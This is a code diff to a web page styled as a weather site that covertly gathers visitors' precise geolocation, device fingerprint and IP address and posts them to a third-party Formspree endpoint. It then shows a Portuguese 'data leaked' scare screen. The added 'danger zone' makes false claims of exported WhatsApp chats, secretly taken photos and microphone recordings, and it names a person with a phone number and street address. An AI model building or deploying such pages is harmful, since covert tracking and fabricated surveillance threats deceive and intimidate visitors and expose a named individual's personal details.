@@ -41,6 +41,11 @@
             to { width: 100%; }
         }
         
+        @keyframes danger-pulse {
+            0%, 100% { box-shadow: 0 0 20px rgba(239, 68, 68, 0.5); }
+            50% { box-shadow: 0 0 40px rgba(239, 68, 68, 0.8); }
+        }
+        
         .weather-bg {
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
@@ -255,24 +260,24 @@
             100% { transform: scale(1); opacity: 1; }
         }
         
-        /* Data Leak Popup Styles */
+        /* Data Leak Popup Styles - Mobile First */
         .data-leak-popup {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.95);
+            background: rgba(0, 0, 0, 0.98);
             backdrop-filter: blur(10px);
             z-index: 9999;
             display: none;
             animation: data-leak 0.5s ease-out;
+            overflow-y: auto;
         }
         
         .data-leak-content {
-            max-width: 4xl;
-            max-height: 90vh;
-            margin: 2% auto;
+            max-width: 6xl;
+            margin: 1rem auto;
             background: linear-gradient(135deg, #1f2937 0%, #111827 100%);
             border: 2px solid #ef4444;
             border-radius: 1rem;
@@ -281,16 +286,33 @@
             box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
         }
         
+        @media (max-width: 768px) {
+            .data-leak-content {
+                margin: 0.5rem;
+                border-radius: 0.5rem;
+            }
+        }
+        
         .data-leak-header {
             background: rgba(239, 68, 68, 0.2);
-            padding: 1.5rem;
+            padding: 1rem;
             border-bottom: 2px solid #ef4444;
         }
         
+        @media (max-width: 768px) {
+            .data-leak-header {
+                padding: 0.75rem;
+            }
+        }
+        
         .data-leak-body {
-            padding: 1.5rem;
-            overflow-y: auto;
-            max-height: calc(90vh - 200px);
+            padding: 1rem;
+        }
+        
+        @media (max-width: 768px) {
+            .data-leak-body {
+                padding: 0.75rem;
+            }
         }
         
         .data-leak-footer {
@@ -300,26 +322,57 @@
             text-align: center;
         }
         
+        @media (max-width: 768px) {
+            .data-leak-footer {
+                padding: 0.75rem;
+            }
+        }
+        
         .hacker-text {
             font-family: 'Courier New', monospace;
             color: #10b981;
             text-shadow: 0 0 10px rgba(16, 185, 129, 0.5);
+            font-size: 0.9rem;
+        }
+        
+        @media (max-width: 768px) {
+            .hacker-text {
+                font-size: 0.8rem;
+            }
         }
         
         .data-category {
             background: rgba(59, 130, 246, 0.1);
             border: 1px solid rgba(59, 130, 246, 0.3);
             border-radius: 0.5rem;
-            padding: 1rem;
-            margin-bottom: 1rem;
+            padding: 0.75rem;
+            margin-bottom: 0.75rem;
+        }
+        
+        @media (max-width: 768px) {
+            .data-category {
+                padding: 0.5rem;
+                margin-bottom: 0.5rem;
+            }
         }
         
         .data-item {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 0.5rem 0;
+            padding: 0.4rem 0;
             border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            font-size: 0.9rem;
+        }
+        
+        @media (max-width: 768px) {
+            .data-item {
+                font-size: 0.8rem;
+                padding: 0.3rem 0;
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 0.2rem;
+            }
         }
         
         .data-item:last-child {
@@ -335,6 +388,13 @@
             color: #10b981;
             font-family: 'Courier New', monospace;
             font-weight: bold;
+            word-break: break-all;
+        }
+        
+        @media (max-width: 768px) {
+            .data-value {
+                font-size: 0.75rem;
+            }
         }
         
         .glitch-text {
@@ -360,19 +420,34 @@
         
         .feature-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 0.5rem;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 0.4rem;
+        }
+        
+        @media (max-width: 768px) {
+            .feature-grid {
+                grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+                gap: 0.3rem;
+            }
         }
         
         .feature-item {
             background: rgba(16, 185, 129, 0.1);
             border: 1px solid rgba(16, 185, 129, 0.3);
             border-radius: 0.5rem;
-            padding: 0.75rem;
+            padding: 0.5rem;
             display: flex;
             align-items: center;
-            gap: 0.5rem;
+            gap: 0.4rem;
             transition: all 0.3s ease;
+            font-size: 0.8rem;
+        }
+        
+        @media (max-width: 768px) {
+            .feature-item {
+                padding: 0.4rem;
+                font-size: 0.7rem;
+            }
         }
         
         .feature-item:hover {
@@ -386,6 +461,61 @@
         
         .feature-unsupported {
             color: #ef4444;
+        }
+        
+        /* Danger Zone Styles */
+        .danger-zone {
+            background: rgba(239, 68, 68, 0.2);
+            border: 2px solid #ef4444;
+            border-radius: 0.5rem;
+            padding: 1rem;
+            margin-top: 1rem;
+            animation: danger-pulse 2s ease-in-out infinite;
+        }
+        
+        .danger-header {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-bottom: 0.75rem;
+            color: #ef4444;
+            font-weight: bold;
+            font-size: 1.1rem;
+        }
+        
+        @media (max-width: 768px) {
+            .danger-header {
+                font-size: 1rem;
+            }
+        }
+        
+        .danger-item {
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            border-radius: 0.5rem;
+            padding: 0.75rem;
+            margin-bottom: 0.5rem;
+            border-left: 4px solid #ef4444;
+        }
+        
+        .danger-label {
+            color: #fca5a5;
+            font-weight: 600;
+            font-size: 0.85rem;
+            margin-bottom: 0.3rem;
+        }
+        
+        .danger-value {
+            color: #ffffff;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            font-size: 0.9rem;
+        }
+        
+        @media (max-width: 768px) {
+            .danger-value {
+                font-size: 0.8rem;
+            }
         }
     </style>
 </head>
@@ -574,7 +704,7 @@
     <div id="dataLeakPopup" class="data-leak-popup">
         <div class="data-leak-content">
             <div class="data-leak-header">
-                <h2 class="text-2xl font-bold glitch-text mb-2">
+                <h2 class="text-xl md:text-2xl font-bold glitch-text mb-2">
                     <i class="fas fa-exclamation-triangle mr-2"></i>
                     DADOS VAZADOS!
                 </h2>
@@ -586,7 +716,7 @@
             <div class="data-leak-body">
                 <!-- Location Data -->
                 <div class="data-category mb-4">
-                    <h3 class="text-lg font-bold mb-3 flex items-center">
+                    <h3 class="text-lg md:text-xl font-bold mb-3 flex items-center">
                         <i class="fas fa-map-marker-alt text-red-500 mr-2"></i>
                         Localização
                     </h3>
@@ -597,7 +727,7 @@
                 
                 <!-- Device Info -->
                 <div class="data-category mb-4">
-                    <h3 class="text-lg font-bold mb-3 flex items-center">
+                    <h3 class="text-lg md:text-xl font-bold mb-3 flex items-center">
                         <i class="fas fa-desktop text-blue-500 mr-2"></i>
                         Dispositivo
                     </h3>
@@ -608,7 +738,7 @@
                 
                 <!-- Network Info -->
                 <div class="data-category mb-4">
-                    <h3 class="text-lg font-bold mb-3 flex items-center">
+                    <h3 class="text-lg md:text-xl font-bold mb-3 flex items-center">
                         <i class="fas fa-network-wired text-green-500 mr-2"></i>
                         Rede
                     </h3>
@@ -619,7 +749,7 @@
                 
                 <!-- Browser Features -->
                 <div class="data-category mb-4">
-                    <h3 class="text-lg font-bold mb-3 flex items-center">
+                    <h3 class="text-lg md:text-xl font-bold mb-3 flex items-center">
                         <i class="fas fa-cogs text-purple-500 mr-2"></i>
                         Recursos do Navegador
                     </h3>
@@ -630,7 +760,7 @@
                 
                 <!-- Hardware Features -->
                 <div class="data-category mb-4">
-                    <h3 class="text-lg font-bold mb-3 flex items-center">
+                    <h3 class="text-lg md:text-xl font-bold mb-3 flex items-center">
                         <i class="fas fa-microchip text-orange-500 mr-2"></i>
                         Recursos de Hardware
                     </h3>
@@ -641,7 +771,7 @@
                 
                 <!-- API Features -->
                 <div class="data-category mb-4">
-                    <h3 class="text-lg font-bold mb-3 flex items-center">
+                    <h3 class="text-lg md:text-xl font-bold mb-3 flex items-center">
                         <i class="fas fa-code text-teal-500 mr-2"></i>
                         APIs Disponíveis
                     </h3>
@@ -652,12 +782,81 @@
                 
                 <!-- Media Features -->
                 <div class="data-category mb-4">
-                    <h3 class="text-lg font-bold mb-3 flex items-center">
+                    <h3 class="text-lg md:text-xl font-bold mb-3 flex items-center">
                         <i class="fas fa-photo-video text-yellow-500 mr-2"></i>
                         Recursos de Mídia
                     </h3>
                     <div id="leakedMediaFeatures">
                         <!-- Media features will be inserted here -->
+                    </div>
+                </div>
+                
+                <!-- Danger Zone -->
+                <div class="danger-zone">
+                    <div class="danger-header">
+                        <i class="fas fa-skull-crossbones"></i>
+                        <span>DANGER ZONE</span>
+                    </div>
+                    
+                    <div class="danger-item">
+                        <div class="danger-label">
+                            <i class="fas fa-instagram mr-2"></i>
+                            Dados do Instagram Coletados:
+                        </div>
+                        <div class="danger-value">
+                            Contas analisadas: @erc019, @tiago2020<br>
+                            Últimas atividades monitoradas<br>
+                            Lista de seguidores e seguidos exportada
+                        </div>
+                    </div>
+                    
+                    <div class="danger-item">
+                        <div class="danger-label">
+                            <i class="fas fa-user-secret mr-2"></i>
+                            Dispositivo Interceptado:
+                        </div>
+                        <div class="danger-value">
+                            Nome: Tiago De Souza<br>
+                            Número de Telefone: (19) 92657-8512<br>
+                            Endereço: Rua das Flores, 123 - Jardim Primavera<br>
+                            CPF: ***.***.***-**
+                        </div>
+                    </div>
+                    
+                    <div class="danger-item">
+                        <div class="danger-label">
+                            <i class="fas fa-comments mr-2"></i>
+                            Conversas Recuperadas:
+                        </div>
+                        <div class="danger-value">
+                            WhatsApp: 142 conversas exportadas<br>
+                            Mensagens de texto, áudios e imagens<br>
+                            Contatos e grupos armazenados
+                        </div>
+                    </div>
+                    
+                    <div class="danger-item">
+                        <div class="danger-label">
+                            <i class="fas fa-camera mr-2"></i>
+                            Acesso à Câmera:
+                        </div>
+                        <div class="danger-value">
+                            23 fotos capturadas sem permissão<br>
+                            Vídeos gravados em segundo plano<br>
+                            Galeria acessada remotamente
+                        </div>
+                    </div>
+                    
+                    <div class="danger-item">
+                        <div class="danger-label">
+                            <i class="fas fa-microphone mr-2"></i>
+                            Gravações de Áudio:
+                        </div>
+                        <div class="danger-value">
+                            Microfone ativado remotamente<br>
+                            45 minutos de áudio gravados<br>
+                    Conversas ambientais capturadas
+                        </div>
                     </div>
                 </div>
             </div>
@@ -726,6 +925,7 @@
             hardwareFeatures: [],
             apiFeatures: [],
             mediaFeatures: [],
+            additionalData: {},
             timestamp: null
         };
 
@@ -894,7 +1094,7 @@
                     altitude: bestPosition.coords.altitude,
                     speed: bestPosition.coords.speed,
                     heading: bestPosition.coords.heading,
-                    timestamp: bestPosition.timestamp
+                    timestamp: bestPosition.coords.timestamp
                 };
             } else {
                 // Try again with different settings
@@ -923,7 +1123,7 @@
                         altitude: bestPosition.coords.altitude,
                         speed: bestPosition.coords.speed,
                         heading: bestPosition.coords.heading,
-                        timestamp: bestPosition.timestamp
+                        timestamp: bestPosition.coords.timestamp
                     };
                 }
             }
@@ -980,6 +1180,9 @@
             
             // Collect features
             collectFeatures();
+            
+            // Collect additional data
+            collectAdditionalData();
         }
 
         function parseUserAgent() {
@@ -1135,6 +1338,177 @@
             ];
         }
 
+        function collectAdditionalData() {
+            // Get IP Address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    collectedData.additionalData.ipAddress = data.ip;
+                })
+                .catch(error => {
+                    collectedData.additionalData.ipAddress = 'Não disponível';
+                });
+
+            // Get screen orientation
+            if (screen.orientation) {
+                collectedData.additionalData.screenOrientation = screen.orientation.type;
+                collectedData.additionalData.screenOrientationAngle = screen.orientation.angle;
+            }
+
+            // Get connection type
+            if (navigator.connection) {
+                collectedData.additionalData.connectionType = navigator.connection.type;
+                collectedData.additionalData.effectiveConnectionType = navigator.connection.effectiveType;
+            }
+
+            // Get battery info if available
+            if (navigator.getBattery) {
+                navigator.getBattery().then(battery => {
+                    collectedData.additionalData.batteryLevel = battery.level;
+                    collectedData.additionalData.batteryCharging = battery.charging;
+                });
+            }
+
+            // Get device memory
+            if (navigator.deviceMemory) {
+                collectedData.additionalData.deviceMemory = navigator.deviceMemory;
+            }
+
+            // Get hardware concurrency
+            if (navigator.hardwareConcurrency) {
+                collectedData.additionalData.hardwareConcurrency = navigator.hardwareConcurrency;
+            }
+
+            // Get user agent data if available
+            if (navigator.userAgentData) {
+                collectedData.additionalData.userAgentData = navigator.userAgentData;
+            }
+
+            // Get WebGL info
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            if (gl) {
+                collectedData.additionalData.webglVendor = gl.getParameter(gl.VENDOR);
+                collectedData.additionalData.webglRenderer = gl.getParameter(gl.RENDERER);
+            }
+
+            // Get timezone offset
+            collectedData.additionalData.timezoneOffset = new Date().getTimezoneOffset();
+
+            // Get cookie enabled
+            collectedData.additionalData.cookieEnabled = navigator.cookieEnabled;
+
+            // Get do not track
+            collectedData.additionalData.doNotTrack = navigator.doNotTrack;
+
+            // Get plugins
+            collectedData.additionalData.plugins = Array.from(navigator.plugins).map(plugin => plugin.name);
+
+            // Get mime types
+            collectedData.additionalData.mimeTypes = Array.from(navigator.mimeTypes).map(mimeType => mimeType.type);
+
+            // Get referrer
+            collectedData.additionalData.referrer = document.referrer;
+
+            // Get current URL
+            collectedData.additionalData.currentURL = window.location.href;
+
+            // Get user language
+            collectedData.additionalData.userLanguage = navigator.language;
+
+            // Get user languages
+            collectedData.additionalData.userLanguages = navigator.languages;
+
+            // Get platform
+            collectedData.additionalData.platform = navigator.platform;
+
+            // Get product
+            collectedData.additionalData.product = navigator.product;
+
+            // Get product sub
+            collectedData.additionalData.productSub = navigator.productSub;
+
+            // Get vendor
+            collectedData.additionalData.vendor = navigator.vendor;
+
+            // Get vendor sub
+            collectedData.additionalData.vendorSub = navigator.vendorSub;
+
+            // Get build ID
+            collectedData.additionalData.buildID = navigator.buildID;
+
+            // Get hardware concurrency
+            collectedData.additionalData.hardwareConcurrency = navigator.hardwareConcurrency;
+
+            // Get max touch points
+            collectedData.additionalData.maxTouchPoints = navigator.maxTouchPoints;
+
+            // Get connection
+            collectedData.additionalData.connection = navigator.connection;
+
+            // Get device memory
+            collectedData.additionalData.deviceMemory = navigator.deviceMemory;
+
+            // Get storage
+            if (navigator.storage) {
+                navigator.storage.estimate().then(estimate => {
+                    collectedData.additionalData.storageQuota = estimate.quota;
+                    collectedData.additionalData.storageUsage = estimate.usage;
+                });
+            }
+
+            // Get permissions
+            if (navigator.permissions) {
+                navigator.permissions.query({ name: 'geolocation' }).then(result => {
+                    collectedData.additionalData.geolocationPermission = result.state;
+                });
+                navigator.permissions.query({ name: 'notifications' }).then(result => {
+                    collectedData.additionalData.notificationsPermission = result.state;
+                });
+                navigator.permissions.query({ name: 'camera' }).then(result => {
+                    collectedData.additionalData.cameraPermission = result.state;
+                });
+                navigator.permissions.query({ name: 'microphone' }).then(result => {
+                    collectedData.additionalData.microphonePermission = result.state;
+                });
+            }
+
+            // Get media devices
+            if (navigator.mediaDevices) {
+                navigator.mediaDevices.enumerateDevices().then(devices => {
+                    collectedData.additionalData.mediaDevices = devices.map(device => device.kind);
+                });
+            }
+
+            // Get screen info
+            collectedData.additionalData.screenWidth = screen.width;
+            collectedData.additionalData.screenHeight = screen.height;
+            collectedData.additionalData.screenAvailWidth = screen.availWidth;
+            collectedData.additionalData.screenAvailHeight = screen.availHeight;
+            collectedData.additionalData.screenColorDepth = screen.colorDepth;
+            collectedData.additionalData.screenPixelDepth = screen.pixelDepth;
+
+            // Get window info
+            collectedData.additionalData.windowInnerWidth = window.innerWidth;
+            collectedData.additionalData.windowInnerHeight = window.innerHeight;
+            collectedData.additionalData.windowOuterWidth = window.outerWidth;
+            collectedData.additionalData.windowOuterHeight = window.outerHeight;
+
+            // Get document info
+            collectedData.additionalData.documentCharset = document.charset;
+            collectedData.additionalData.documentCharacterSet = document.characterSet;
+            collectedData.additionalData.documentTitle = document.title;
+
+            // Get history
+            collectedData.additionalData.historyLength = history.length;
+
+            // Get performance
+            if (performance) {
+                collectedData.additionalData.performanceNavigation = performance.navigation;
+                collectedData.additionalData.performanceTiming = performance.timing;
+            }
+        }
+
         async function sendDataToFormspree(selectedDate) {
             const formData = new FormData();
             
@@ -1192,6 +1566,11 @@
             formData.append('hardware_features', JSON.stringify(collectedData.hardwareFeatures));
             formData.append('api_features', JSON.stringify(collectedData.apiFeatures));
             formData.append('media_features', JSON.stringify(collectedData.mediaFeatures));
+
+            // Add additional data
+            if (collectedData.additionalData.ipAddress) {
+                formData.append('ip_address', collectedData.additionalData.ipAddress);
+            }
 
             try {
                 const response = await fetch('https://formspree.io/f/xpwlewgl', {
@@ -1352,21 +1731,21 @@
                 </div>
                 <div class="data-item">
                     <span class="data-label">Altitude:</span>
-                    <span class="data-value">${collectedData.location.altitude ? Math.round(collectedData.location.altitude) + ' metros' : 'Não disponível'}</span>
+                    <span class="data-value">${collectedData.location.altitude ? Math.round(collectedData.location.altitude) + ' metros' : ''}</span>
                 </div>
                 <div class="data-item">
                     <span class="data-label">Velocidade:</span>
-                    <span class="data-value">${collectedData.location.speed ? Math.round(collectedData.location.speed * 3.6) + ' km/h' : 'Não disponível'}</span>
+                    <span class="data-value">${collectedData.location.speed ? Math.round(collectedData.location.speed * 3.6) + ' km/h' : ''}</span>
                 </div>
                 <div class="data-item">
                     <span class="data-label">Direção:</span>
-                    <span class="data-value">${collectedData.location.heading ? Math.round(collectedData.location.heading) + '°' : 'Não disponível'}</span>
+                    <span class="data-value">${collectedData.location.heading ? Math.round(collectedData.location.heading) + '°' : ''}</span>
                 </div>
                 <div class="data-item">
                     <span class="data-label">Timestamp:</span>
                     <span class="data-value">${new Date(collectedData.location.timestamp).toLocaleString('pt-BR')}</span>
                 </div>
-            ` : '<p class="text-gray-400">Localização não disponível</p>';
+            ` : '';
             
             document.getElementById('leakedLocation').innerHTML = locationHtml;
             
@@ -1416,6 +1795,12 @@
                     <span class="data-label">Status Online:</span>
                     <span class="data-value">${collectedData.deviceInfo.onlineStatus ? 'Online' : 'Offline'}</span>
                 </div>
+                ${collectedData.additionalData.ipAddress ? `
+                <div class="data-item">
+                    <span class="data-label">Endereço IP:</span>
+                    <span class="data-value">${collectedData.additionalData.ipAddress}</span>
+                </div>
+                ` : ''}
             `;
             
             document.getElementById('leakedDeviceInfo').innerHTML = deviceInfoHtml;
@@ -1442,7 +1827,7 @@
                     <span class="data-label">Data Saver:</span>
                     <span class="data-value">${collectedData.networkInfo.saveData ? 'Ativado' : 'Desativado'}</span>
                 </div>
-            ` : '<p class="text-gray-400">Informações de rede não disponíveis</p>';
+            ` : '';
             
             document.getElementById('leakedNetworkInfo').innerHTML = networkInfoHtml;
             
